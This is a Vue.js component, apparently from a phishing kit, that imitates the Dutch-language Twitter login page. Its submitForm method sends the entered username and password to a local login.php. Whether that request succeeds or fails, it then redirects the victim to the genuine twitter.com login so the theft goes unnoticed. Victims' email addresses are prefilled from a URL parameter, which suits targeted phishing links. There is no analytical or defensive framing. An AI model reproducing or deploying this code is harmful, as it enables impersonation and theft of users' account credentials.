<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
        progressActive: false,
        referrerPage: "//twitter.com/login?lang=nl",
        username: '',
        password: '',
        usernameFocused: false,
        passwordFocused: false,
        showError: false
    }
  },
  methods: {
    initiatePage () {
        let uri = window.location.href.split("?");
        if (uri.length > 0 && uri[1] !== undefined) {
            let vars = uri[1].split("&");
            let getVars = {};
            let tmp = "";
            vars.forEach(function(v) {
              tmp = v.split("=");
              if (tmp.length == 2)
                getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
            });
            this.username  = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
            this.showError = "undefined" !== typeof getVars["username_disabled"]
        }
    },
    usernameFocusChange (focused) {
        this.usernameFocused = focused
    },
    passwordFocusChange (focused) {
        this.passwordFocused = focused
    },
    submitForm () {
        let vm = this
        axios.post('login.php', {username: vm.username, password: vm.password})
        .then(res => {
          vm.progressActive = true
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 250);
        })
        .catch(error => {
          vm.progressActive = true
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 250);
        })
    }
  },
  computed: {
    usernameLabel () {
        return this.usernameFocused ? 'color: rgba(29, 161, 242, 1.00);' : ''
    },
    passwordLabel () {
        return this.passwordFocused ? 'color: rgba(29, 161, 242, 1.00);' : ''
    },
    buttonEnabled () {
        return this.username !== '' && this.password !== ''
    },
    emailLabelText () {
        return this.showError ? 'Telefoonnummer of e-mailadres' : 'Telefoonnummer, e-mailadres of gebruikersnaam'
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

